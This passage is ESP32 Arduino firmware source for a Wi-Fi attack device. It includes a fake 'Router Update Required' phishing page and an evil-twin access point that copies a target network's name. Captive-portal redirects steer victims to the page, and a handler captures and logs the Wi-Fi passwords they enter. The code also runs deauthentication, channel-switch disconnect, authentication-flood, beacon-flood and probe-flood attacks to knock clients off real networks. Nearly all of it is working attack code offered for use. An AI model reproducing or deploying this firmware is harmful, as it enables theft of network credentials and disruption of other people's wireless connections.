        button:hover { background: #005bb5; }
        .footer { margin-top: 1.5rem; font-size: 0.75rem; color: #8a8d91; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg>
        </div>
        <h2>Router Update Required</h2>
        <p>Your router requires a critical firmware update. Please verify your wireless password to continue.</p>
        <form action="/login" method="POST">
            <input type="password" name="password" placeholder="Wireless Password" required minlength="8">
            <button type="submit">Verify & Update</button>
        </form>
        <div class="footer">© 2026 Router Configuration Utility. All rights reserved.</div>
    </div>
</body>
</html>
)=====";

void setupWebServer() {
    // Captive Portal Handlers (Android & iOS)
    server.on("/generate_204", []() { 
        server.sendHeader("Location", "http://router.update/", true); 
        server.send(302, "text/plain", ""); 
    }); 
    server.on("/hotspot-detect.html", []() { 
        server.sendHeader("Location", "http://router.update/", true); 
        server.send(302, "text/plain", ""); 
    });

    server.on("/", []() {
        if (evilTwinActive && !server.hasArg("admin")) {
            if (server.hostHeader() != "router.update") {
                server.sendHeader("Location", "http://router.update/", true);
                server.send(302, "text/plain", "");
                return;
            }
            server.send_P(200, "text/html", FAKE_LOGIN_HTML);
        } else {
            server.send_P(200, "text/html", INDEX_HTML);
        }
    });
    
    server.on("/admin", []() {
        // Allows the attacker to access the dashboard even during Evil Twin
        server.send_P(200, "text/html", INDEX_HTML);
    });

    server.on("/login", HTTP_POST, []() {
        if (server.hasArg("password")) {
            capturedPassword = server.arg("password");
            beep(2000, 150, 4); // Alert admin
            Serial.println("[EVIL TWIN] Password Captured: " + capturedPassword);
        }
        String successHtml = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:-apple-system,sans-serif;text-align:center;padding:3rem;background:#f0f2f5;color:#1c1e21;}h2{color:#166534;}</style></head><body><h2>Update Processing</h2><p>Verification successful. Your router is rebooting and your connection will be restored shortly. You may close this window.</p></body></html>";
        server.send(200, "text/html", successHtml);
    });

    server.on("/status", []() {
        String json = "{";
        json += "\"armed\":"    + String(attackEnabled ? "true" : "false") + ",";
        json += "\"attacking\":" + String(attacking    ? "true" : "false") + ",";
        json += "\"etActive\":" + String(evilTwinActive ? "true" : "false") + ",";
        json += "\"endTime\":"  + String((unsigned long)attackEndTime) + ",";
        json += "\"packetsSent\":" + String(packetsSent) + ",";
        json += "\"captured\":\"" + capturedPassword + "\"";
        json += "}";
        server.send(200, "application/json", json);
    });

    server.on("/scan", []() {
        // Synchronous scan for instant results without needing multiple clicks
        int n = WiFi.scanNetworks(false, true, false, 120);
        if (n <= 0) { server.send(200, "application/json", "[]"); return; }
        String json = "[";
        for (int i = 0; i < n; i++) {
            if (i > 0) json += ",";
            json += "{";
            json += "\"ssid\":"  + (WiFi.SSID(i).length() > 0 ? "\"" + WiFi.SSID(i) + "\"" : "\"(Hidden)\"") + ",";
            json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
            json += "\"ch\":"    + String(WiFi.channel(i)) + ",";
            json += "\"rssi\":"  + String(WiFi.RSSI(i));
            json += "}";
        }
        json += "]";
        WiFi.scanDelete();
        server.send(200, "application/json", json);
    });

    server.on("/select", []() {
        if (!server.hasArg("bssid")) { server.send(400, "text/plain", "Missing args"); return; }
        if (server.hasArg("ssid")) targetSSID = server.arg("ssid");
        String bssid = server.arg("bssid");
        
        const char* ptr = bssid.c_str();
        for(int i=0; i<6; i++) {
            targetMAC[i] = strtol(ptr, (char**)&ptr, 16);
            if (*ptr == ':') ptr++;
        }
        
        targetSet = true;
        if (server.hasArg("ch")) targetChannel = server.arg("ch").toInt();
        Serial.printf("[SEL] MAC=%02X:%02X:%02X:%02X:%02X:%02X CH=%d\n",
            targetMAC[0],targetMAC[1],targetMAC[2],targetMAC[3],targetMAC[4],targetMAC[5], targetChannel);
        server.send(200, "text/plain", "OK");
    });

    server.on("/eviltwin", []() {
        if (!attackEnabled) { server.send(403, "text/plain", "Not authorized"); return; }
        if (!targetSet) { server.send(400, "text/plain", "No target selected"); return; }
        
        int state = server.arg("state").toInt();
        if (state == 1) {
            evilTwinActive = true;
            capturedPassword = "";
            WiFi.softAP(targetSSID.c_str(), NULL, targetChannel); // Create Open network with TARGET name
            
            // Automatically launch CSA Disconnect alongside Evil Twin to force victims off
            attacking = true;
            currentAttackType = 1; // 1 = CSA Disconnect
            
            int dur = 300;
            if (server.hasArg("duration")) dur = server.arg("duration").toInt();
            attackEndTime = millis() + (dur * 1000UL);
            packetsSent = 0;
            
            Serial.println("[EVIL TWIN] Started Open AP: " + targetSSID);
        } else {
            evilTwinActive = false;
            attacking = false;
            WiFi.softAP(AP_SSID, AP_PASS, apChannel); // Restore Secure Management AP
            Serial.println("[EVIL TWIN] Stopped");
        }
        server.send(200, "text/plain", "OK");
    });

    server.on("/attack", []() {
        if (!attackEnabled) { server.send(403, "text/plain", "Not authorized"); return; }
        
        if (server.hasArg("type")) currentAttackType = server.arg("type").toInt();

        if (currentAttackType <= 2 && !targetSet) { server.send(400, "text/plain", "No target selected"); return; }
        
        attackDuration = server.arg("duration").toInt();
        if (attackDuration < 1 || attackDuration > 300) attackDuration = 30;
        attackEndTime = millis() + ((unsigned long)attackDuration * 1000UL);
        attacking = true;
        packetsSent = 0;
        
        server.send(200, "text/plain", "Attack started");
    });

    server.on("/stop", []() {
        attacking = false;
        esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
        server.send(200, "text/plain", "Stopped");
    });

    server.onNotFound([]() {
        if (evilTwinActive) {
            server.sendHeader("Location", "http://router.update/", true);
            server.send(302, "text/plain", "");
        } else {
            server.sendHeader("Location", "http://192.168.4.1/", true);
            server.send(302, "text/plain", "");
        }
    });

    server.begin();
}


// ─────────────────────────────────────────
//  NON-BLOCKING ATTACK ENGINE (V7)
// ─────────────────────────────────────────
unsigned long sliceTimer = 0;
bool attackingPhase = false;
uint8_t floodCh = 1;

void handleAttack() {
    if (evilTwinActive && capturedPassword != "") {
        evilTwinActive = false;
        attacking = false;
        WiFi.softAP(AP_SSID, AP_PASS, apChannel);
        beep(3000, 200, 5); // Success siren!
    }

    if (!attacking && !evilTwinActive) return;
    
    if (millis() >= attackEndTime) {
        attacking = false;
        if (evilTwinActive) {
            evilTwinActive = false;
            WiFi.softAP(AP_SSID, AP_PASS, apChannel);
            Serial.println("[EVIL TWIN] Timeout reached. Restoring Management AP.");
        } else {
            esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
        }
        Serial.println("[ATK] Complete. TX=" + String(packetsSent));
        beep(2000, 200, 3);
        return;
    }

    if (evilTwinActive) {
        // EVIL TWIN MODE: We must balance attacking the real AP with serving the Captive Portal.
        // If we block the CPU, the web server fails and the Fake AP doesn't appear.
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        
        if (millis() - sliceTimer > 50) { 
            // Every 50ms, send a tiny burst to knock victims off
            sliceTimer = millis();
            sendCSA_Beacon(targetChannel);
            sendDeauthPacket();
            sendDeauthPacket();
        }
        return; // Immediately return so server.handleClient() and WiFi Task can run!
    }

    if (attackingPhase) {
        if (millis() - sliceTimer > 800) { // 800ms Attack Window
            esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
            attackingPhase = false;
            sliceTimer = millis();
        } else {
            // Blast packets MASSIVELY inside the 800ms window
            unsigned long burstEnd = sliceTimer + 800;
            while(millis() < burstEnd && attacking) {
                for(int j=0; j<10; j++) {
                    if (currentAttackType == 0) sendAuthFloodPacket();
                    else if (currentAttackType == 1) sendCSA_Beacon(targetChannel);
                    else if (currentAttackType == 2) sendDeauthPacket();
                    else if (currentAttackType == 3) sendBeaconPacket(floodCh);
                    else if (currentAttackType == 4) sendProbeRequestPacket();
                }
                delay(1); // CRITICAL: Feed FreeRTOS watchdog and let WiFi Task process Tx queue!
            }
        }
    } else {
        if (millis() - sliceTimer > 200) { // 200ms UI Window
            sliceTimer = millis();
            attackingPhase = true;
            if (currentAttackType <= 2) {
                esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
            } else {
                floodCh = (floodCh % 11) + 1; // Cycle 1-11 sequentially for floods
                esp_wifi_set_channel(floodCh, WIFI_SECOND_CHAN_NONE);
            }
        }
    }
}


void setup() {
    Serial.begin(115200);
    delay(500);

    pinMode(BUZZER_PIN, OUTPUT);
    digitalWrite(BUZZER_PIN, LOW);

    SPI.begin();
    mfrc522.PCD_Init();
    delay(100);

    initFakeNetworks();

    // WiFi init — DO NOT call esp_wifi_init() manually, Arduino does it
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(AP_SSID, AP_PASS, apChannel);
    delay(500);
    esp_wifi_set_max_tx_power(78);  // Must be AFTER softAP

    esp_wifi_set_promiscuous(true);

    dnsServer.start(53, "*", WiFi.softAPIP());
    setupWebServer();

    WiFi.scanNetworks(true);
    Serial.println("[SYS] Ready. IP=" + WiFi.softAPIP().toString());
    beep(100, 1);
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
    checkRFID();
    handleAttack();
    
    // Auto-Lock Authorization when management phone disconnects
    static int lastStationCount = 0;
    int currentStations = WiFi.softAPgetStationNum();
    if (lastStationCount > 0 && currentStations == 0 && !attacking && !evilTwinActive) {
        if (attackEnabled) {
            attackEnabled = false;
            Serial.println("[SYS] Phone disconnected. Auto-locked.");
            beep(400, 500, 1);
        }
    }
    lastStationCount = currentStations;
}